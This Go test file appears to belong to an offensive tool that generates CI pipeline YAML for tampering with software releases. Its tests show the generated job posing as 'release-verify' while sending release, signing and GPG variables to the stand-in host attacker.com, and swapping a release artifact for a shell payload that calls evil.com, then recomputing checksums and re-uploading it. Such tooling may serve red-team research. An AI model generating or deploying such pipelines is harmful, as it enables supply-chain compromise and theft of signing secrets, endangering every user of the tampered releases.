package payloads

import (
	"strings"
	"testing"
)

func TestGenerateReleaseTamperPipelineYAML_Default(t *testing.T) {
	y := GenerateReleaseTamperPipelineYAML(ReleaseTamperPipelineOptions{})
	for _, want := range []string{
		"release-verify:",
		"stage: release",
		"$CI_COMMIT_TAG",
		"release_assets.json",
		"allow_failure: true",
	} {
		if !strings.Contains(y, want) {
			t.Errorf("expected %q in output:\n%s", want, y)
		}
	}
	_ = mustParse(t, y)
}

func TestGenerateReleaseTamperPipelineYAML_CustomTag(t *testing.T) {
	y := GenerateReleaseTamperPipelineYAML(ReleaseTamperPipelineOptions{
		ReleaseTag: "v1.2.3",
	})
	if !strings.Contains(y, "v1.2.3") {
		t.Fatalf("expected custom tag v1.2.3 in output:\n%s", y)
	}
	_ = mustParse(t, y)
}

func TestGenerateReleaseTamperPipelineYAML_WithWebhook(t *testing.T) {
	y := GenerateReleaseTamperPipelineYAML(ReleaseTamperPipelineOptions{
		WebhookURL: "https://attacker.com/collect",
	})
	for _, want := range []string{
		"https://attacker.com/collect",
		"release_env.txt",
		"RELEASE|SIGN|GPG",
	} {
		if !strings.Contains(y, want) {
			t.Errorf("expected %q in output:\n%s", want, y)
		}
	}
	_ = mustParse(t, y)
}

func TestGenerateReleaseTamperPipelineYAML_WithTagsAndImage(t *testing.T) {
	y := GenerateReleaseTamperPipelineYAML(ReleaseTamperPipelineOptions{
		Common: CommonOptions{
			Tags:  []string{"self-hosted", "linux"},
			Image: "alpine:3.18",
		},
	})
	if !strings.Contains(y, "self-hosted") {
		t.Fatalf("expected runner tag in output:\n%s", y)
	}
	if !strings.Contains(y, "alpine:3.18") {
		t.Fatalf("expected image in output:\n%s", y)
	}
	_ = mustParse(t, y)
}

func TestGenerateReleaseTamperPipelineYAML_DefaultJobName(t *testing.T) {
	y := GenerateReleaseTamperPipelineYAML(ReleaseTamperPipelineOptions{})
	d := mustParse(t, y)
	if len(d.Jobs) == 0 {
		t.Fatal("expected at least one job")
	}
	if d.Jobs[0].Name != "release-verify" {
		t.Fatalf("expected default job name 'release-verify', got %q", d.Jobs[0].Name)
	}
}

func TestGenerateReleaseTamperPipelineYAML_WithArtifact(t *testing.T) {
	y := GenerateReleaseTamperPipelineYAML(ReleaseTamperPipelineOptions{
		ReleaseTag:     "v2.0.0",
		ArtifactPath:   "dist/app.tar.gz",
		PayloadContent: "#!/bin/sh\ncurl http://evil.com",
		ChecksumFile:   "checksums.txt",
	})
	for _, want := range []string{
		"dist/app.tar.gz",
		"v2.0.0",
		"checksums.txt",
		"sha256sum",
		"Re-uploading",
	} {
		if !strings.Contains(y, want) {
			t.Errorf("expected %q in output:\n%s", want, y)
		}
	}
	_ = mustParse(t, y)
}

func TestGenerateReleaseTamperPipelineYAML_CustomJobAndStage(t *testing.T) {
	y := GenerateReleaseTamperPipelineYAML(ReleaseTamperPipelineOptions{
		Common: CommonOptions{
			JobName: "verify-checksums",
			Stage:   "deploy",
		},
	})
	d := mustParse(t, y)
	if len(d.Jobs) == 0 {
		t.Fatal("expected at least one job")
	}
	if d.Jobs[0].Name != "verify-checksums" {
		t.Fatalf("expected job name 'verify-checksums', got %q", d.Jobs[0].Name)
	}
	if !strings.Contains(y, "stage: deploy") {
		t.Fatalf("expected custom stage 'deploy' in output:\n%s", y)
	}
}
